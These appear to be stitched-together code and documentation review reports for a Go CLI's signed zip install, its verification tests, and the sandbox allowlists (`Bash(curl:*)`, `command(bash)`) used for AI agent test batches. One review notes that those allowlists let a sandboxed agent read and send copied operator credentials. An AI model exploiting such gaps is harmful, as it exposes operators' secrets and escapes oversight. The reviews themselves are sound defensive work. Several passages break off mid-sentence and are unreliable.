- **[low / confidence: medium]** `.agents/docs/testing/2026-09-28-verify-token-rule-and-matrix.md:40-47`: the evidence exercised only the agy list, with one `ls` and one `git status`. The Claude list change (`:29-31` of the log) was not run at all, and the log's "Not exercised" section does not say so. It names only "the full skill matrix" and "Antigravity for probe 1".
  - The rows that write outside the clone (`retro`, `distill`, `handoff`, `feedback` write under `<home>/.config/sh-agent`) are also not evidenced under a `trustedWorkspaces` that names only the clone. Whether agy's `write_file(*)` is allowed outside a trusted workspace is unverified. I did not verify agy behaviour.
  - **Fix.** Add the Claude list and the outside-clone writes to "Not exercised", or run one row of each.

## Criteria

1. **Dead code: pass.** There is no code in the range. The removed agy entries `edit_file(*)`/`list_dir(*)` are correctly gone, as agy logged them as invalid.
2. **Flow tracing: fail.** The procedure's allowlists were traced against the scenario table, and two rows need removed commands (finding 2). The Claude curl rule, traced through the Claude Code 2.1.283 parser, does not match its target commands (finding 1).
3. **Standards conformance: fail on describing text; pass on restatements.**
   - The secret-shaped-path clause at `context/AGENTS.md:45` agrees with its only other restatement, `skills/preflight/SKILL.md:40`, which already names `antigravity-oauth-token`. `agents/security.md:33` is generic and consistent.
   - The skill-matrix rationale overstates the protection (finding 3).
   - The evidence log's "Not exercised" section is incomplete (finding 4).
4. **Directory layout: pass.** The evidence is in `testing/`, the entry in `changes/`, and the handoff in `handoffs/`.
5. **Simplicity (DIY-except-security): pass.** No code and no dependency changed. Nothing is hand-rolled.
6. **Decoupling: pass.** One context clause and one procedure section. No seams are affected.

## Not examined

- The range's handoff `handoffs/2026-09-28-1600-v1.7.0-released.md` and the verifier log `testing/2026-09-28-verify-v1.8.0-candidate.md`. Both are trail, not source. I did not read them beyond the diff stat.
- agy 1.2.8's permission semantics (`command(<name>)`, `write_file(*)` outside `trustedWorkspaces`). I took them from the evidence log and did not verify them.
- No sandbox run was executed. The Claude rule matching was established by reading the installed 2.1.283 parser, not by a live run.
- `/review --docs` over the range is a separate lens and was not done here.

## Outcome

The operator settled findings 1–3 as matrix option 1: the lists the scenarios need are restored (`bash`, `python3`, plain `curl`), `edit_file(*)` and `list_dir(*)` stay out, and the procedure states that the allowlist is not a security boundary. It lands in the `update --from-zip` feature commit (`changes/2026-09-28-1752-update-from-zip.md`). Finding 1 (the curl prefix syntax) is gone with the rule. Finding 3 (the stated reason) is replaced by the honest statement.

title: Review — v1.7.0-a962740-code (2026-09-28)
body:
# Review — v1.7.0-a962740-code   (2026-09-28)

Range reviewed: v1.7.0..a962740

Coverage taken from the trail and not re-read line by line: `v1.7.0..381e86d` (`review-v1.7.0-381e86d-code.md`), `381e86d..1cb2608` (`review-universal-cleanup.md`, range `381e86d..worktree (agents skills)`), and `1cb2608..worktree` before the final tweaks (`review-update-from-zip-code-r3.md`). This round reviewed in full the tweaks listed in r3's `## Outcome`, plus `testing/skill-matrix.md` in its final state against the round-1 findings of `review-v1.7.0-381e86d-code.md`.

## Status: COMPLETE

## Verdict: APPROVE WITH NITS

Nothing in the shipped code is broken. The post-r3 tweaks to `updateFromZip` are correct:
- the sweep now runs only after a successful, non-dry install;
- a `-`-prefixed value is refused before any command runs;
- the `RemoveAll` warning is wired;
- usage and package doc now list `--dry-run` and `--from-zip`.

`gofmt -l cmd internal` is empty, `go vet ./cmd/sh-agent/` is clean, and `go test -race -count=1 -run 'Zip|DryRun' ./cmd/sh-agent/` passes. I ran all three at a962740 on a clean tree.

The worst remaining items are in `testing/skill-matrix.md`, which is not deployed:
1. Its Claude bullet names a protection that the procedure does not implement for the Claude credential copy. With the reach to the real home that the same sentence admits, it is no protection during a batch at all.
2. Its union allowlist contradicts `AGENTS.md:66`'s "fewest grants the run needs". It grants `command(curl)` although no row runs curl.

There is also one test header that is stale against the final sweep placement, and that test does not guard it. All of these are low severity, and none blocks the release.

## Findings

- **[low / confidence: high]** `.agents/docs/testing/skill-matrix.md:13` — "The protection is that the copied token lives only for the batch and is deleted by name after it" overstates what the procedure does.
  - **(a) The Claude credential copy is never deleted.** The sandbox home carries copies of the operator's `~/.claude/.credentials.json` and `~/.claude.json` (`testing/2026-09-21-verify-sandbox-pruned-context.md:13`). The only deletion step in the procedure is the agy bullet's "the file and the copied token are deleted by name after the batch" (`:14`), and it names the agy token only. So the Claude credential copy, now readable and sendable by the granted `bash`/`python3`/`curl`, is never named for deletion.
  - **(b) Deletion after the batch is not protection during it.** The same sentence says `go`, `git`, `bash` and `python3` "can each run anything and reach the real home". An agent in the batch can therefore read the real credentials too. Deleting the copies afterwards only means the sandbox home stops holding live credentials. That is the stated-property problem of round-1 finding 3, narrowed but not gone.
  - **Fix:**
    - name `<home>/.claude/.credentials.json` and `<home>/.claude.json` in the delete-by-name step;
    - reword the sentence to its true claim: "nothing protects the credentials during a batch; the copies are deleted by name after it so the sandbox home does not keep them".

- **[low / confidence: high]** `.agents/docs/testing/skill-matrix.md:14` against `AGENTS.md:66` — the rules disagree.
  - **The rule.** `AGENTS.md` § Testing says the agy sandbox settings are "written for the run with the fewest grants the run needs".
  - **What the matrix does.** Under option 1 the matrix writes one union list for every row. `command(bash)`, `command(python3)` and `command(curl)` go to `review`, `bug` and every other row. `command(curl)` is needed by no row at all: the `bash` row (`:45`) only writes curl into a script, and the checks run outside the CLI.
  - **Its own remedy.** This also contradicts the matrix's closing rule, "a scenario denied a command it needs gets that one command added here, by name".
  - **Why it matters.** Option 1 was the operator's decision (`changes/2026-09-28-1752-update-from-zip.md:22`), but the rule it departs from was left standing. The next matrix run either breaks `AGENTS.md:66` or follows it and drops the list. This is the "two texts on one mechanism" shape.
  - **Fix.** Pick one:
    - grant per row: `bash` and `python3` only to their two rows, and `curl` to none;
    - or amend `AGENTS.md:66` to "the fewest grants the batch needs" and drop `command(curl)` and `Bash(curl:*)`, which no row needs.

- **[low / confidence: high]** `cmd/sh-agent/zip_test.go:514-515` — the header of `TestUpdateFromZipRefusedRunSweepsNothing` describes the intermediate placement, not the final one.
  - **The header and the code.** The header says "The sweep runs only after the zip is unpacked". The code (`main.go:1096-1100`) sweeps only after `installFiles` succeeds.
  - **What the test catches.** The test refuses a non-zip file inside `UnpackZip`. It fails if the sweep returns to its pre-r3 place before `UnpackZip`, which is a real guard. It cannot catch a sweep placed between `UnpackZip` and `installFiles`, the exact placement its header describes.
  - **The other refusal test.** `TestUpdateFromZipRefusedContentWritesNothing` refuses at install time, but uses a fresh home with no stale `zip-*`, so it cannot catch that placement either.
  - **Fix:**
    - correct the header to "only after a successful install";
    - seed an hour-old `zip-old` in the content-refused test, or in a sibling test, and assert that it survives.

- **[low / confidence: medium]** `.agents/docs/reviews/2026-09-28-review-v1.7.0-381e86d-code.md` `## Outcome` — round-1 finding 4 is neither fixed nor rebutted.
  - Finding 4 says the Claude list was never exercised and the log's "Not exercised" section omits it. The Outcome settles findings 1–3 only.
  - The option-1 lists (`Bash(bash:*)`, `Bash(python3:*)`, `Bash(curl:*)`, `command(bash)`, `command(python3)`, `command(curl)`) have been exercised by no run either. Only `skill-matrix.md` contains `command(bash)` (grep over `testing/`).
  - This is expected before the next full matrix run. It should be stated in the Outcome, per the Definition of Done ("fixed or rebutted"), so the matrix is not read as verified.

Checked and not findings:
- **The `-` refusal** (`main.go:128-131`). `reorder` treats `--from-zip` as value-taking (`:709`), so `update --from-zip --dry-run` yields the value `--dry-run`. The refusal returns before `updateFromZip` runs, so nothing is created. A real file named `-x.zip` is still reachable as `./-x.zip`.
  - `TestFromZipDashValueRefused` fails without the fix. Without it, the run reaches `UnpackZip`, whose "reading the archive" error does not contain "--from-zip needs a file". It also fails if the refusal moves after `updateFromZip`.
- **Named-result flow after the tweak.**
  - `if err := installFiles(...); err != nil { return err }` shadows `err`, but `return err` assigns the named result before the defers run. `RemoveCreated` therefore still sees the failure.
  - The defers run in LIFO order: `RemoveAll(dir)` first, then `RemoveCreated`.
  - A `RemoveAll` failure warns and leaves a young `zip-*` dir. A later successful run sweeps it once it is an hour old.
  - When `UnpackZip` fails, its own defer removes `tmp`, so `RemoveCreated` meets an empty chain.
- **The sweep during a successful run.** The sweep runs while this run's own `zip-*` still exists, but that directory is younger than an hour, so the sweep keeps it.
- **Round-1 findings 1 and 2 are resolved.**
  - `Bash(curl:*)`, `Bash(bash:*)` and `Bash(python3:*)` are valid prefix rules, a prefix followed by a space.
  - The `bash` and `python` rows now have the commands they run.
  - The removed "No `bash`, `python3` or unrestricted `curl`" claim has no surviving restatement outside append-only `changes/` and `reviews/`. The `handoffs/…-1600` mention is a dated record.

## Criteria
1. Dead code — pass. `short`, `sweepStaleZipDirs`, `MkdirAllTracked` and `RemoveCreated` all have callers (`main.go:445,1070,1075,1100`, `zip.go:201`). No commented-out code or debug output was added.
2. Flow tracing — pass. The flow is flag parse → refusal → `updateFromZip` → `UnpackZip` → `installFiles` → sweep → defers. The error propagates through the named result. There is one test gap: the finding on `zip_test.go:514`.
3. Standards conformance — pass for the Go (gofmt, vet, `%w` wrapping in `UnpackZip`). Fail, at low severity, on the restatement rule: `AGENTS.md:66` against `skill-matrix.md:14`, and the stale test header.
4. Directory layout — pass. The tests sit beside `main.go`, and the review and scratch files are in their places.
5. Simplicity (DIY-except-security) — pass. Stdlib only. The `sha256` is a checksum of the zip, consumed as designed, and is not hand-rolled crypto. The unsigned-zip medium stays open by operator decision, per r3.
6. Decoupling — pass. The zip mechanics live in `internal/harness/zip.go`, and the CLI keeps the orchestration and the sweep.

## Not examined
- The full diff of `v1.7.0..381e86d` and `381e86d..1cb2608`. I relied on the prior reports whose ranges cover them.
- Changes in `1cb2608..a962740` other than the listed tweaks. I relied on r3 for these: `internal/harness/zip.go` beyond `UnpackZip`, `plan.go`, the `status`/`diff` zip branches at `main.go:223,409,445,656`, the ADRs, the plans, `delivery.md`, the deploy guides and README.
- The full test suite. I ran only `-run 'Zip|DryRun'` in `./cmd/sh-agent`, and `go vet` for that package only.
- Must-fail mutations. None was run: this reviewer does not modify source, and the tests' ability to fail was reasoned from the code, not observed.
- Any live Claude or agy run of the option-1 lists.

# Review — v1.7.0-a962740 docs   (2026-09-28)

## Verdict: APPROVE WITH NITS

The delivery-model expansion (three ways in, the zip place, ADR-034 superseded-in-part, `update --from-zip`/`--dry-run`, `status`/`diff` for a zip install) is threaded consistently across `AGENTS.md`, `README.md`, `REQUIREMENTS.md` R8/R9, `.agents/docs/specs/sh-agent/delivery.md`, and `.agents/docs/deploy/{local,remote}.md`; the `usage` string in `cmd/sh-agent/main.go` agrees with README's daily-commands table, the map draws the zip place dashed with a `--from-zip repeats it` label, and `status`/`diff` output strings match the delivery-model prose (`diff` refuses to compare a zip install; `status` reports `zip sha256:<hex>` presence only). ## Criteria
1. Dead code — n/a — docs lens
2. Flow tracing — n/a — docs lens

title: Review — v1.8.0-52cebd8-code (2026-09-28)
body:
# Review — v1.8.0-52cebd8-code   (2026-09-28)

Range reviewed: v1.8.0..52cebd8 (commits e4ae34c, 0b762db, 52cebd8; 36 files)

## Status: COMPLETE

## Verdict: APPROVE WITH NITS

Nothing in the range is broken. All six open findings from code review round 2 (`2026-09-28-review-signed-zip-code-r2.md`) are fixed, and I re-ran two of the fixes as evidence.

- **The bypass hint is pinned.** I re-inserted the hint in a scratch copy of 52cebd8. The mutation compiled, and three `TestVerifyZipSums` subtests failed.
- **Release step 3b works, and it can fail.** I ran it verbatim in scratch. A binary built with the signer that signed the sums printed `VERIFIED`, and the step's `grep` returned 0. A binary carrying the real compiled-in signer was refused with exit 1, the `grep` returned 1, and nothing was written.

`gofmt -l cmd internal` is empty, `go vet ./...` is clean, and `go test -race -count=1 ./...` passes in all three packages. R8 and R9 hold:
- the R9 edit carries its approval note and ADR-039;
- the map, the code and the docs land in one commit (52cebd8);
- verification is local and stdlib plus OpenSSH;
- nothing new is fetched or pushed.

The four findings below are low. The worst is the refusal text: it gives no path out when an operator downloads GitHub's own "Source code (zip)" beside the release sums. The command still refuses, so this is a usability problem, not a security one.

## Findings

- **[low / confidence: medium]** `internal/harness/release.go:464` and `:467`: the refusal messages never name the zip the release actually publishes.
  - **The case:** a release page also shows GitHub's automatic "Source code (zip)", named `styrman-harness-X.Y.Z.zip` (no `v`, different bytes). Downloaded next to the release's `SHA256SUMS` and `.sig`, it is refused at `:464` with "…put the zip … under the release's own file name".
  - **The loop:** renaming it to `styrman-harness-vX.Y.Z.zip` then fails at `:467` with "checksum mismatch … download it again". Downloading the same file again loops back to the same refusal.
  - **Safety:** it fails closed, so this is not a security issue. But the easiest way out the operator will find is to move the sums away, which is the bypass ADR-039 is careful never to suggest.
  - **Fix:** once the signature holds, the sums are trusted, so `:464` can list the `.zip` name(s) that the signed file does carry ("this release publishes styrman-harness-vX.Y.Z.zip"). Add a unit case with a differently named zip beside good sums that asserts the expected name appears.

- **[low / confidence: medium]** `internal/harness/zip_test.go:419` (`TestSweepInterruptedClonesGlobCharsInHome`) uses `report-999999` as "a pid that is not running".
  - **Why it can flake:** this box's `/proc/sys/kernel/pid_max` is 4194304, so pid 999999 can be live. When it is, `alive` keeps the directory and the test fails with "the home's own stale … was not swept". The code is correct; the test fails spuriously.
  - **Fix:** use `report-0`. `strconv.Atoi` parses it, and `alive(0)` is false by definition (`report.go:445`). The result is deterministic, and the test still fails on the old glob code.
  - **Related (not a finding):** the test covers `report.go` but lives in `zip_test.go`, not `report_test.go`.

- **[low / confidence: medium]** `README.md:14`: the map's `preflight` node still reads "SSH-signed tag, signed binaries".
  - The edge at `:37` was relabelled "signed binaries and zip", and R9's Release bullet now includes the zip.
  - The map is the contract (project `AGENTS.md` rules 3 and 5). `TestHarnessMap` pins only verbs, so it cannot catch this.
  - **Fix:** "SSH-signed tag, signed binaries and zip".

- **[low / confidence: low]** `context/AGENTS.md:37`: the new routing sentence says to run `npx skills add <repo> -s <skill>` from the checkout root, without `-y`.
  - The text it replaces (the old find-skills Step 6) and `skills/VENDORED.md`'s own add procedure both pass `-y`.
  - Without `-y`, the skills CLI prompts interactively. In an agent's non-TTY shell, that prompt can hang or abort.
  - The behavioural run (`testing/2026-09-28-verify-find-skills-routing.md`) only asked the model where and how it would install; it never ran the command. I did not run the CLI either, hence low confidence.
  - **Fix:** add `-y`, which also keeps the sentence consistent with `VENDORED.md`.

## Prior findings — status

From `2026-09-28-review-signed-zip-code.md` (r1):

| # | Finding | Status |
|---|---|---|
| 1 | Map not updated for the release zip | FIXED (r2 verified the edges and `linkStyle`), except the node label: see low 3 above |
| 2 | remote.md "five assets" | FIXED: `:170` says "all six", `:182` "the six assets" |
| 3 | VERIFIED path untested | FIXED: `TestUpdateFromZipVerifiedAndTampered`. r2 reproduced the mutation |
| 4 | Stale-pair remedy | FIXED at r2, then refined. The `stale sums of another release` subtest asserts "its own release" and forbids "download that release" |
| 5 | AGENTS.md rule 2 / README "binaries with signed checksums" | FIXED |
| 6 | R9's wording for the one-file case | Code is stricter than the text (it refuses), and now tested both ways (`sig missing`, `sig present, sums missing`). R9's wording is unchanged: it needs the operator and is not re-raised |

From `2026-09-28-review-signed-zip-code-r2.md` (r2):

| # | Finding | Status |
|---|---|---|
| 1 | Step 5 ran after publishing, linux/amd64 only | FIXED: it is now step 3b (`remote.md:160-163`), before `gh release create`, and runs `sh-agent-$(go env GOOS)-$(go env GOARCH)`. Executed in scratch, both ways, as described in the verdict |
| 2 | Hint removal not pinned | FIXED AND PINNED. The mutation (target unique, compiled, restored from a saved copy, `cmp` equal) failed `TestVerifyZipSums/{sig_missing,foreign_key,sig_present,_sums_missing}` |
| 3 | Stale-pair advice pointed at the old release | FIXED, with a subtest |
| 4 | Plan D7 still stated the hint | FIXED: D7 now reads "never suggests removing them … amended after security r1" |
| 5 | ADR-039 "messages name what to download" | FIXED by narrowing the ADR: it now says the messages never suggest removing the checksums |
| 6 | `ErrZipUnsigned` godoc split | FIXED: `release.go:423-426` |

## Other checks

**`verifyRelease` → `verifySignedSums` split.** The order is unchanged: stat sums → capped read → stat sig → identity → signers file → `ssh-keygen -Y verify` with the sums bytes on stdin → marker. The tag compare and per-asset checksum stay in `verifyRelease`. The signed bytes are the bytes parsed, and the zip hash is taken from the one buffer that is unpacked.

**`VerifyZipSums` decision table.**
- Neither file present gives `ErrZipUnsigned`.
- A stat error other than not-exist refuses (tested with an unsearchable folder).
- A single file present refuses.
- Otherwise it checks the signature, then the marker, then the zip's own line, then the compare.

The temporary signers directory is under `$TMPDIR` and removed by `defer`, not under the home or the download folder. `SwapReleaseSigner` is not linked into the built binary (`go tool nm` on a plain build lists `VerifyZipSums` but not it), so the change entry's claim holds.

**`updateFromZip`.** The check closure maps `ErrZipUnsigned` to UNVERIFIED and propagates every other error before `zip.NewReader` and any write. `MkdirAllTracked`/`RemoveCreated` still undo the created parent on refusal, and `TestUpdateFromZipForeignSignatureRefused` asserts an empty home. The sweep runs only after a successful non-dry install (`TestUpdateFromZipInstallRefusalSweepsNothing`).

**Report sweep (0b762db).** It now uses `ReadDir` with a name prefix, `IsDir`, and no symlinks, so it no longer builds a glob from the home. The new test fails on the old glob code: `h[1]` matches `h1`, so both assertions fire.

**Release zip vs `UnpackZip` limits.** A `git archive` of 52cebd8 is 3.0 MB (the cap is 64 MB) and holds 895 tracked paths (the entry cap is 5000). Its only symlink, `.agents/skills`, lies outside the five trees, and `checkZipTrees` skips it before the symlink refusal. The refusal therefore cannot fire on a release zip today.

**find-skills.** It is verbatim again. `skills/VENDORED.md` records the restore. The routing now lives in the context, which fits the Antigravity limit (per the verify log: 20,822 of 22,000 bytes; the size test passes in the suite run).

**BUG-094.** The status is set to `fixed` in both the record and `INDEX.md`, the one allowed edit.

## Criteria

1. **Dead code: pass.** `SwapReleaseSigner` has a cross-package test caller and is not linked into the binary. One nit, not a finding: `cmd/sh-agent/zip_test.go:519` is a leftover duplicate comment line ("// nothing, not even a stale leftover.") from the comment rewrite above it.
2. **Flow tracing: pass.**
   - The flow `updateFromZip` → `UnpackZip(check)` → `VerifyZipSums` → `verifySignedSums`/`checksumFor` is consistent.
   - Errors propagate, and each refusal comes before any write.
   - Resources are cleaned up on every path.
   - Every new test can fail, shown by r2's mutation and mine.
   - The release procedure's step 3b was executed both ways.
3. **Standards conformance: pass with lows.** The gates are clean. The restatements of the Release procedure are updated in AGENTS.md, README, remote.md and delivery.md; the remaining gap is the map node label (low 3). `delivery.md` states the verified/unverified split once, and the others point at it, so rule 6 holds.
4. **Directory layout: pass.** The new code sits in the existing files. The report-sweep test is in the right package but the wrong file (noted under low 2).
5. **Simplicity (DIY-except-security): pass.**
   - Signatures use OpenSSH `ssh-keygen -Y verify`, run as a subprocess.
   - Hashing uses stdlib `crypto/sha256`.
   - No primitive is hand-rolled, and no dependency is added (R4).
6. **Decoupling: pass.** `UnpackZip` takes a plain `func(sum string) error` and knows nothing about signatures. Verification stays in `release.go`.

## Not examined

- **macOS:** I did not run the tests there, and I did not run step 3b on darwin/arm64. The `go env GOOS/GOARCH` naming was checked only against step 1's loop.
- **The real release key:** step 3b ran with a scratch signer through `-ldflags -X`, never with the operator's key.
- **The skills CLI:** I did not run `npx skills add` without `-y`, which is why low 4 has low confidence.
- **GitHub's Source code zip name:** the `styrman-harness-X.Y.Z.zip` name in low 1 comes from GitHub's documented naming, not from a download in this session.
- **Trail files read only in part:** the handoff (e4ae34c), the cold-read reviews r1/r2, the security reviews r1/r2, the v180-followups review and verify logs, and the signed-zip verify log. I checked the change entry `2026-09-28-1925-signed-zip.md` against the code, but not the 1850 follow-ups entry.
- **The feedback repository:** I did not check that commit `1703cea` exists there.
- **The skill-matrix change:** I read the diff (curl dropped, credential wording), but no matrix batch was run.

## Outcome

1. **Wrong-zip refusal loop: fixed.**
   - Both refusals now name the zip the signed sums list, via `zipNamesIn` in `release.go`. They say that GitHub's "Source code" archive is a different file.
   - The new subtest `TestVerifyZipSums/github_source_archive` covers the arrangement the finding measured: the GitHub-named archive beside good sums, then renamed.
   - Must-fail: `zipNamesIn` returning "no zip" compiled and failed that subtest.
2. **pid flake: fixed.** The test uses `report-0`; `alive(0)` is false by definition.
3. **Map node label: fixed.** It now reads "SSH-signed tag, signed binaries and zip".
4. **`-y` missing: fixed.** The context sentence now reads `npx skills add <repo> -s <skill> -y`, which matches `skills/VENDORED.md`.
5. **Nit, the duplicate comment line: fixed.**

The range (three commits: v1.8.0 follow-ups, then the signed-release-zip feature) is unusually well

caught and fixed a stale mermaid map, stale "binaries with signed checksums" wording, and a missing-hint

range's own code review already found and explicitly left unfixed: REQUIREMENTS.md R9's "a zip without
them is installed marked UNVERIFIED" is textually ambiguous about the one-file-present case, where the
code actually refuses rather than installs UNVERIFIED — nothing in this range's docs commit closed that
ambiguity, so it is still live at HEAD.

## Findings

- **[low / confidence: medium]** `REQUIREMENTS.md:43` (R9) vs `internal/harness/release.go:415-448`
  (`VerifyZipSums`). R9 says: "When the release's `SHA256SUMS` and `SHA256SUMS.sig` sit beside the zip,
  the zip is verified against them and refused if either check fails; a zip without them is installed
  marked `UNVERIFIED`." "Them"/"without them" reads as the pair, so a reader could take "a zip without
  them" to cover the case where only one of the two files is present — but the code (`VerifyZipSums`,
  `internal/harness/release.go:436-441`) treats "only one present" as a hard refusal (`cannot check for
  signed checksums…`/the underlying `verifySignedSums` "has no SHA256SUMS"/"has no SHA256SUMS.sig"
  errors), never as UNVERIFIED — only "both absent" returns `ErrZipUnsigned` and installs UNVERIFIED.
  Same ambiguity in `.agents/docs/architecture/DECISIONS.md:361-362` (ADR-039) and
  `.agents/docs/specs/sh-agent/delivery.md:32`, which use the same "a release zip is verified… when it
  and its `.sig` sit beside it… while a zip of `main` has nothing to verify and is installed marked
  `UNVERIFIED`" phrasing. This is not a new finding: `.agents/docs/reviews/2026-09-28-review-signed-zip-
  code.md:40` raised it in round 1 ("make R9 and ADR-039 say it explicitly…the R9 edit needs operator
  approval") and `.agents/docs/reviews/2026-09-28-review-signed-zip-code-r2.md:84` records it as "not
  addressed… not re-raised" — i.e. it was consciously left open, not missed, but it is still an
  inaccurate restatement of the code's behaviour sitting in an immutable-without-approval file at HEAD.
  **Owner: main** (REQUIREMENTS.md changes need the operator's explicit approval per project AGENTS.md
  and the file's own header; documentation cannot edit it unilaterally). **Fix:** add the clause the prior
  review proposed — "…when either sits beside the zip without the other, the zip is refused; only when
  neither is present is it installed UNVERIFIED" — to R9, ADR-039, and `delivery.md` § The model in one
  commit, with the operator's approval, per rule 6 (one home) and REQUIREMENTS.md's own change protocol.

## Not fully verified (kept as low confidence, not treated as a finding)

- `.agents/docs/testing/2026-09-28-verify-signed-zip.md` and `-e2e.md` were read only via `grep`/partial
  read to confirm they exercise the `VERIFIED`/`UNVERIFIED` strings; I did not replay the E2E procedure
  myself (out of scope for a docs-freshness pass, and the range's own `verifier`/`security` r1-r2 already
  did so per the trail).

## Checked and found consistent (no finding)

- **README.md** § How it works mermaid map: node `releases` now reads "platform binaries + release zip +
  signed SHA256SUMS"; new dashed edge `releases -. "release zip + signed SHA256SUMS, by hand; verified"
  .-> zipPlace` (correctly dashed per rule 4: still a by-hand download); `linkStyle` index shift (edges 5+
  renumbered) is arithmetically correct — I hand-counted all 21 edges (0-20) against the four `linkStyle`
  groups and they match the update/install/report/release colour split. `TestHarnessMap` passes.
- **README.md** § Install from a zip: prose now correctly distinguishes a release zip (verified, shows
  `VERIFIED against the signed SHA256SUMS of release vX.Y.Z`) from a `main` zip (`UNVERIFIED`), matches
  `cmd/sh-agent/main.go:1080-1110`.
- **AGENTS.md** rule 2 ("publishes that tag's binaries and a zip of its tree, with signed checksums") and
  **README.md**'s Release bullet: both updated together, matching R9's amended Release procedure — the
  round-1 review's finding 3 (stale "binaries with signed checksums" wording) is fixed.
- **REQUIREMENTS.md** R9's Release bullet and Zip-place sub-bullet, **delivery.md** § The model, and
  **DECISIONS.md** ADR-039 all state the six-asset release and the verify-then-refuse-else-UNVERIFIED
  model consistently with each other and with the code, apart from the one ambiguity above.
- **`.agents/docs/deploy/remote.md`** § Releases: step 1b (`git archive` zip), the `sha256sum` line naming
  the zip, step 3b (self-verification with the host's own built binary before publishing, matching
  `security-signed-zip.md`'s remediation), "all six"/"six assets" — all match the code and the six-file
  upload loop.
- **`context/AGENTS.md`** § Global vs project: the new sentence about routing a found skill into the
  checkout's `skills/` (`npx skills add … -s <skill>` or `sh-agent adopt`, then `sh-agent install`) is
  behaviourally verified in `.agents/docs/testing/2026-09-28-verify-find-skills-routing.md` (2 of 2

  `TestRenderedContextFitsAntigravityBlock` still passes (20,822/22,000 bytes).
- **`skills/find-skills/SKILL.md`** restored verbatim at `435076e`; **`skills/VENDORED.md`**'s note updated

  `curl` together (matches "matrix drops curl" in the commit message; no stray `Bash(curl:*)` or

- **BUG-094 / BUG-093 / BUG-092**: `.agents/docs/bugs/INDEX.md` and the individual bug files agree on

  removed by ordinary commit `1703cea`, matching the referenced commit's own message in `git log`).
- Code-level cross-check: `UnpackZip`'s new `check func(sum string) error` parameter is used consistently
  at its one production call site (`cmd/sh-agent/main.go:1094`); no stale two-argument call left anywhere.
- `agents/bugs.md`'s example-row reset to a placeholder is internal template content, not a behaviour
  description — no drift to check.

## Criteria

1. Dead code — not applicable to a docs-freshness pass; no orphaned doc files or exported symbols noticed
   while reading the diff (e.g. `SwapReleaseSigner` is a test-only hook, documented as such in its own
   doc-comment and in the change entry).

   testing,architecture}` per the project's own layout).
5. Simplicity — n/a to a docs pass.
6. Decoupling — n/a to a docs pass.

## Not examined

## Verdict: APPROVE WITH NITS

Nothing in the range is broken. There is one real code change: `VerifyZipSums` now returns `ErrZipUnsigned` when EITHER file of the `SHA256SUMS`/`SHA256SUMS.sig` pair is missing (`||` instead of `&&`, `internal/harness/release.go:450`). `updateFromZip` maps that to an install marked `UNVERIFIED`. A zip WITH the pair still runs the full signature and checksum check, and a failed check still refuses it. This matches the zip-place bullet of R9 as restored ("a zip without them is installed marked `UNVERIFIED`") and ADR-041. I found no `--unverified` flag left in code, usage text, comments or tests. The flag is not defined, so `--unverified` now fails at flag parsing instead of being silently ignored. The two findings below are low-severity test gaps. Neither blocks the release.

## Findings
- **[low / confidence: medium]** `cmd/sh-agent/zip_test.go:648-658` (`TestUpdateFromZipUnsignedSaysUnverified`): the behaviour this range changes, "a half pair installs `UNVERIFIED`", is pinned only at unit level (`internal/harness/zip_test.go:478-486` and `:517-525`). No end-to-end `run([... "update","--from-zip" ...])` test puts one file beside the zip and checks exit 0, the `UNVERIFIED` line and the `;unverified` manifest origin. Today the cmd path is shared with the neither-file case, so the risk is a future special case in `updateFromZip`, not a present defect. Fix: add a table case with only `SHA256SUMS` beside the zip and one with only `.sig` to that test, asserting the output line and the manifest origin.
- **[low / confidence: medium]** `internal/harness/zip_test.go:348-350` (`TestUnpackZipLateRefusalCreatesNoParent`, pre-existing and unchanged in this range): it checks only `err == nil`. It does not check that the refusal is the late one (symlink or duplicate) named in the test comment. An earlier refusal in the names pass also creates no parent, so that would pass the test without reaching the path it claims to cover. This is the only refusal test in either zip test file that does not assert its own cause. Fix: assert that the error names the symlink or duplicate, as the `UnpackZip` table test at `:163-168` does with `c.want`.

## Evidence
- `gofmt -l cmd internal` printed nothing. `go vet ./...` was clean. `go test -race ./...` passed all three packages at c30b8da (working tree clean apart from untracked review and testing artifacts).
- Mutation 1 was run in a scratch copy from `git archive c30b8da` under `.agents/scratch/`, never the working tree. The target line was unique (count 1). It changed `||` back to `&&` at `release.go:450`, compiled (`go vet` passed), and failed `TestVerifyZipSums` at `zip_test.go:484` ("has no SHA256SUMS.sig, want ErrZipUnsigned") and `:523`. The changed behaviour is therefore pinned. The cmd `Zip` tests still passed under this mutation, which is the basis of the first finding.
- Mutation 2 was run in a fresh scratch copy (unique target). In `updateFromZip`'s `check`, it changed `return err` on a failed verification to `return nil`. It compiled, and `TestUpdateFromZipForeignSignatureRefused` and `TestUpdateFromZipVerifiedAndTampered` failed. A zip with the pair is still refused when its check fails, and that is pinned end to end.
- Every refusal test in `cmd/sh-agent/zip_test.go` asserts its own error text (`has no description`, `not a readable zip`, `does not verify`, and so on). The only exception across both zip test files is the pre-existing one in finding 2.
- The `"unverified"` substring guards at `cmd/sh-agent/zip_test.go:640,731` and `internal/harness/zip_test.go:495,587` stay valid: they assert that a failed-check refusal never suggests an unverified install. They do not refer to a flag.
- The refusal texts `has no SHA256SUMS` / `has no SHA256SUMS.sig` (`release.go:249,256`) can no longer be reached from the zip path. They are not dead code, because `verifySignedSums` is still called by the release-binary update (`release.go:225`).

## Criteria
1. Dead code — pass. No flag, branch or helper was left behind. `verifySignedSums`'s missing-file errors still serve the binary-update caller.
2. Flow tracing — pass. `run` → flag parse (no `unverified` flag) → `updateFromZip` → `UnpackZip(check)` → `VerifyZipSums`. `ErrZipUnsigned` becomes nil and the install is marked `UNVERIFIED` (output line plus `;unverified` origin). Any other error is returned before a byte is written, and `MkdirAllTracked`/`RemoveCreated` roll back the parent. A non-`ErrNotExist` stat error is still a refusal (`release.go:441-446`). The stat and then the verify race is safe, because a file that vanishes between them produces a refusal, not an install.
3. Standards conformance — pass. gofmt and vet are clean. The usage text (`main.go:44`), the comments at `main.go:1085-1089` and `release.go:428-437`, README § zip, delivery.md § The model and R9 all describe the half-pair `UNVERIFIED` behaviour consistently. No living file outside historical records mentions `--unverified`: the grep matched only REQUIREMENTS' approval history and the closed plan `plans/2026-09-28-signed-zip.md`. REQUIREMENTS R9 was changed with the operator approval recorded, ADR-041.
4. Directory layout — pass. No new files.
5. Simplicity (DIY-except-security) — pass. The change removes code. Signature checking still uses `ssh-keygen -Y verify` and `crypto/sha256`, not a hand-rolled primitive.
6. Decoupling — pass. The policy "a half pair is unsigned" lives in `harness.VerifyZipSums`, and the cmd layer only maps the sentinel error.

## Not examined
